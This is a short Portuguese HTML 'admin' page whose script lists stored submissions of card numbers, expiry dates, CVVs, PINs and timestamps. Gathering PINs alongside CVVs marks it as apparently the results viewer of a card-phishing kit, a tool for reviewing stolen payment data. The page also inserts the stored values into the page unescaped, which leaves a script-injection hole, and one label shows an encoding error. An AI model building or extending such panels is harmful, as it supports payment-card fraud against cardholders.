<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Admin - Envios Recebidos</title>
</head>
<body>
  <h2>Lista de Dados Enviados</h2>
  <div id="list"></div>
  <script>
    let envios = JSON.parse(localStorage.getItem('envios')) || [];
    if(envios.length === 0){
      document.getElementById('list').innerHTML = "Nenhum envio encontrado!";
    } else {
      let html = "<ol>";
      envios.forEach(function(envio, i){
        html += `<li><b>${i+1}:</b> Cart√£o: ${envio.cartao}, Validade: ${envio.validade}, CVV: ${envio.cvv}, PIN: ${envio.pin}, Hora: ${envio.hora}</li>`;
      });
      html += "</ol>";
      document.getElementById('list').innerHTML = html;
    }
  </script>
</body>
</html>
